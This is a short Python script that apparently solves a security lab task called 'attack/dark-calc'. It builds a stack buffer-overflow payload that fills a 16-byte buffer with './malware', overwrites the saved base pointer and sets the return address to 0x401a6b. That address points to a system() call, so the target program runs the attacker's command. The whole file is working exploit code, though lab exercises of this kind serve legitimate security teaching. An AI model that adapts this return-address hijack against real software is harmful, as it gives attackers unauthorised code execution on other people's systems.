#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct

# command_buf should contain only "./malware"
command = b"./malware\x00"

# 16-byte local buffer
buffer = command.ljust(16, b"A")

# Overwrite the saved rbp (8 bytes)
saved_rbp = b"B" * 8

# Return to the system(command_buf) part of eval()
target = 0x401a6b
return_address = struct.pack("<Q", target)

payload = buffer + saved_rbp + return_address

assert len(payload) == 32
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload + b"\n")
